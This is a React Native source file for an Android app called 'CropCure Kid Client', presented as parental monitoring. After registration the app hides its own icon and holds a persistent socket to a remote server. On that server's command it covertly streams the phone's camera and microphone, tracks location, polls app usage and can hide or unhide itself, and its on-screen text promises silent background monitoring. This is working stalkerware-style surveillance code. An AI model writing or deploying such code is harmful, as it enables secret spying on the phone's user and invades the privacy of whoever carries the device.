import React, { useState, useEffect } from 'react';
import { StyleSheet, Text, View, Button, TextInput, ScrollView, ActivityIndicator, NativeModules, Platform } from 'react-native';
import AsyncStorage from '@react-native-async-storage/async-storage';
import { requestAllPermissions } from './app/services/permissions';
import { CameraService } from './app/services/CameraService';
import { MicrophoneService } from './app/services/MicrophoneService';
import { LocationService } from './app/services/LocationService';
import { VisibilityService } from './app/services/VisibilityService';
import { AppUsageService } from './app/services/AppUsageService';
import { io } from 'socket.io-client';

const BACKEND_URL = 'http://localhost:8443';

export default function App() {
  const [serverUrl, setServerUrl] = useState('http://192.168.1.24:8443');
  const [parentId, setParentId] = useState('');
  const [deviceId, setDeviceId] = useState('device_123'); // Default identifier
  const [deviceName, setDeviceName] = useState("John's Android");
  const [statusMsg, setStatusMsg] = useState('Configuration Mode');
  const [registered, setRegistered] = useState(false);
  const [loading, setLoading] = useState(false);
  const [socketInstance, setSocketInstance] = useState(null);

  // Service instances
  const [services, setServices] = useState({
    camera: null,
    mic: null,
    location: null,
    usage: null
  });

  // Load saved credentials from AsyncStorage on app launch
  useEffect(() => {
    loadSavedConfig();
  }, []);

  const loadSavedConfig = async () => {
    try {
      const savedServerUrl = await AsyncStorage.getItem('@cropcure_server_url');
      const savedParentId = await AsyncStorage.getItem('@cropcure_parent_id');
      const savedDeviceId = await AsyncStorage.getItem('@cropcure_device_id');
      const savedDeviceName = await AsyncStorage.getItem('@cropcure_device_name');
      const savedRegistered = await AsyncStorage.getItem('@cropcure_registered');

      if (savedServerUrl) setServerUrl(savedServerUrl);
      if (savedParentId) setParentId(savedParentId);
      if (savedDeviceId) setDeviceId(savedDeviceId);
      if (savedDeviceName) setDeviceName(savedDeviceName);

      if (savedRegistered === 'true' && savedServerUrl && savedDeviceId && savedParentId) {
        console.log('[Android Socket] Saved credentials loaded from AsyncStorage.');
        console.log('[Android Socket] Auto-connecting device:', savedDeviceId, 'Parent:', savedParentId);
        connectSocketAndServices(savedServerUrl, savedDeviceId, savedParentId, savedDeviceName);
      }
    } catch (e) {
      console.warn('[Android Socket] Failed to load saved config from AsyncStorage:', e.message);
    }
  };

  const registerDevice = async () => {
    if (!parentId || !deviceId) {
      setStatusMsg('Please provide Parent ID and Device ID');
      return;
    }

    setLoading(true);
    setStatusMsg('Checking permissions & registering device...');

    try {
      // Step 1: Check and request all hardware permissions
      const permResult = await requestAllPermissions();
      if (!permResult.allGranted) {
        setStatusMsg('Error: Camera, Mic & GPS permissions are required');
        setLoading(false);
        return;
      }

      // Step 1b: Check and request Apps with Usage Access permission on Android
      if (Platform.OS === 'android' && NativeModules.UsageStatsModule) {
        try {
          const usageGranted = await NativeModules.UsageStatsModule.checkUsagePermission();
          if (!usageGranted) {
            setStatusMsg('Please grant "Apps with Usage Access" permission in settings and try again.');
            await NativeModules.UsageStatsModule.openUsageSettings();
            setLoading(false);
            return;
          }
        } catch (err) {
          console.warn('Usage permission check error:', err.message);
        }
      }

      const activeServer = serverUrl.trim().replace(/\/+$/, '');

      // Step 2: Register device via REST API
      const response = await fetch(`${activeServer}/api/auth/kid/register`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          parentId,
          deviceId,
          name: deviceName,
          age: 12,
          model: 'Samsung Galaxy S22',
          os: 'Android',
          osVersion: '13.0'
        })
      });

      const resData = await response.json();
      if (!response.ok) {
        throw new Error(resData.error || 'Failed to register with parent server');
      }

      // Save credentials persistently in AsyncStorage
      await AsyncStorage.setItem('@cropcure_server_url', activeServer);
      await AsyncStorage.setItem('@cropcure_parent_id', parentId);
      await AsyncStorage.setItem('@cropcure_device_id', deviceId);
      await AsyncStorage.setItem('@cropcure_device_name', deviceName);
      await AsyncStorage.setItem('@cropcure_registered', 'true');

      // Step 3: Trigger App Hiding
      await VisibilityService.hideAppIcon();

      // Step 4: Establish Socket connection and start background services
      await connectSocketAndServices(activeServer, deviceId, parentId, deviceName);
    } catch (e) {
      console.error('[Android Socket] Registration failed:', e);
      setStatusMsg(`Registration Error: ${e.message}`);
    } finally {
      setLoading(false);
    }
  };

  const connectSocketAndServices = async (activeServer, targetDeviceId, targetParentId, targetDeviceName) => {
    try {
      console.log('[Android Socket] Connecting to backend:', activeServer);
      console.log('[Android Socket] Device ID being sent:', targetDeviceId);
      console.log('[Android Socket] Parent ID being sent:', targetParentId);

      // Establish Socket connection sending BOTH deviceId and parentId in auth & query
      const socket = io(activeServer, {
        auth: { deviceId: targetDeviceId, parentId: targetParentId },
        query: { deviceId: targetDeviceId, parentId: targetParentId },
        reconnection: true,
        reconnectionAttempts: Infinity,
        reconnectionDelay: 1000,
        transports: ['websocket', 'polling']
      });

      setSocketInstance(socket);

      socket.on('connect', () => {
        console.log('[Android Socket] Socket connected: ID =', socket.id);
        console.log('[Android Socket] Device ID being sent:', targetDeviceId);
        console.log('[Android Socket] Parent ID being sent:', targetParentId);

        // Emit matching register-device event for backend listener
        socket.emit('register-device', { deviceId: targetDeviceId, parentId: targetParentId }, (res) => {
          if (res && res.status === 'ok') {
            console.log('[Android Socket] Device registration success confirmed by backend');
          } else {
            console.log('[Android Socket] Device registration emitted');
          }
        });

        setStatusMsg(`✓ Connected as device "${targetDeviceId}". Stealth background monitoring active.`);
      });

      socket.io.on('reconnect', (attempt) => {
        console.log(`[Android Socket] Reconnected after ${attempt} attempt(s). Re-registering device: ${targetDeviceId}`);
        console.log('[Android Socket] Device ID being sent:', targetDeviceId);
        console.log('[Android Socket] Parent ID being sent:', targetParentId);
        socket.emit('register-device', { deviceId: targetDeviceId, parentId: targetParentId });
      });

      socket.on('connect_error', (err) => {
        console.warn('[Android Socket] Socket connection error:', err.message);
      });

      // Initialize background services
      const camSvc = new CameraService(targetDeviceId, socket);
      const micSvc = new MicrophoneService(targetDeviceId, socket);
      const locSvc = new LocationService(targetDeviceId, socket);
      const usageSvc = new AppUsageService(targetDeviceId, socket, activeServer);

      // Start Background location watch & app usage polling
      await locSvc.startTracking();
      usageSvc.startMonitoring(15000);

      // Register socket command listeners with exact logs
      socket.on('camera-start-command', async (data) => {
        try {
          console.log(`[Android Socket] Device ${targetDeviceId} received CAMERA_START command`);
          await camSvc.startStream(data.streamId, data.parentSocketId);
        } catch (e) {
          console.warn('[Android Socket] Camera start error:', e.message);
        }
      });

      socket.on('camera-switch-command', (data) => {
        try {
          console.log(`[Android Socket] Device ${targetDeviceId} received CAMERA_SWITCH command to ${data.facing}`);
          camSvc.setFacing(data.facing);
        } catch (e) {
          console.warn('[Android Socket] Camera switch error:', e.message);
        }
      });

      socket.on('camera-stop-command', async () => {
        try {
          console.log(`[Android Socket] Device ${targetDeviceId} received CAMERA_STOP command`);
          await camSvc.stopStream();
        } catch (e) {
          console.warn('[Android Socket] Camera stop error:', e.message);
        }
      });

      socket.on('mic-start-command', async (data) => {
        try {
          console.log(`[Android Socket] Device ${targetDeviceId} received MIC_START command`);
          await micSvc.startStream(data.streamId);
        } catch (e) {
          console.warn('[Android Socket] Mic start error:', e.message);
        }
      });

      socket.on('mic-stop-command', async () => {
        try {
          console.log(`[Android Socket] Device ${targetDeviceId} received MIC_STOP command`);
          await micSvc.stopStream();
        } catch (e) {
          console.warn('[Android Socket] Mic stop error:', e.message);
        }
      });

      socket.on('app-hide-command', async () => {
        await VisibilityService.hideAppIcon();
      });

      socket.on('app-show-command', async () => {
        await VisibilityService.showAppIcon();
      });

      setServices({ camera: camSvc, mic: micSvc, location: locSvc, usage: usageSvc });
      setRegistered(true);
    } catch (e) {
      console.error('[Android Socket] Socket initialization failed:', e.message);
    }
  };

  return (
  <ScrollView contentContainerStyle={styles.container}>
    <Text style={styles.title}>CropCure Kid Client Setup</Text>
    <Text style={styles.subtitle}>Administrative Stealth Monitoring System</Text>

    <View style={styles.statusBox}>
      <Text style={styles.statusLabel}>Status Dashboard</Text>
      <Text style={styles.statusValue}>{statusMsg}</Text>
    </View>

    {!registered ? (
      <View style={styles.form}>
        <Text style={styles.label}>Server URL (Backend Host)</Text>
        <TextInput
          style={styles.input}
          value={serverUrl}
          onChangeText={setServerUrl}
          placeholder="http://192.168.1.24:8443"
          placeholderTextColor="#6c6489"
        />

        <Text style={styles.label}>Parent ID / Linking Code</Text>
        <TextInput
          style={styles.input}
          value={parentId}
          onChangeText={setParentId}
          placeholder="Enter Parent MongoDB ID"
          placeholderTextColor="#6c6489"
        />

        <Text style={styles.label}>Device Unique ID</Text>
        <TextInput
          style={styles.input}
          value={deviceId}
          onChangeText={setDeviceId}
          placeholder="device_123"
          placeholderTextColor="#6c6489"
        />

        <Text style={styles.label}>Device Display Name</Text>
        <TextInput
          style={styles.input}
          value={deviceName}
          onChangeText={setDeviceName}
          placeholder="John's Android"
          placeholderTextColor="#6c6489"
        />

        {loading ? (
          <ActivityIndicator size="large" color="#00f2fe" style={{ marginTop: 20 }} />
        ) : (
          <Button title="Link & Hide Application" color="#9b51e0" onPress={registerDevice} />
        )}
      </View>
    ) : (
      <View style={styles.registeredBox}>
        <Text style={{ color: '#00ff87', fontWeight: 'bold', fontSize: 16, textAlign: 'center' }}>
          ✓ Device Configured successfully
        </Text>
        <Text style={{ color: '#a39bb8', textAlign: 'center', marginTop: 10 }}>
          The launcher icon is now disabled. Monitoring will continue silently in the background. Press Home to return to the Android screen.
        </Text>
      </View>
    )}
  </ScrollView>
);
}

const styles = StyleSheet.create({
  container: {
    padding: 30,
    backgroundColor: '#0a051b',
    minHeight: '100%'
  },
  title: {
    fontSize: 24,
    fontWeight: 'bold',
    color: '#fff',
    textAlign: 'center',
    marginTop: 40
  },
  subtitle: {
    fontSize: 12,
    color: '#00f2fe',
    textAlign: 'center',
    marginTop: 5,
    textTransform: 'uppercase',
    letterSpacing: 1
  },
  statusBox: {
    backgroundColor: 'rgba(255,255,255,0.03)',
    borderWidth: 1,
    borderColor: 'rgba(255,255,255,0.08)',
    borderRadius: 12,
    padding: 16,
    marginVertical: 24
  },
  statusLabel: {
    color: '#a39bb8',
    fontSize: 11,
    textTransform: 'uppercase'
  },
  statusValue: {
    color: '#ff007f',
    fontSize: 15,
    fontWeight: 'bold',
    marginTop: 4
  },
  form: {
    gap: 15
  },
  label: {
    color: '#a39bb8',
    fontSize: 13,
    marginBottom: 4
  },
  input: {
    backgroundColor: 'rgba(255,255,255,0.05)',
    borderWidth: 1,
    borderColor: 'rgba(255,255,255,0.08)',
    borderRadius: 8,
    padding: 12,
    color: '#fff',
    fontSize: 14
  },
  registeredBox: {
    backgroundColor: 'rgba(0, 255, 135, 0.05)',
    borderColor: '#00ff87',
    borderWidth: 1,
    padding: 20,
    borderRadius: 12,
    marginTop: 20
  }
});
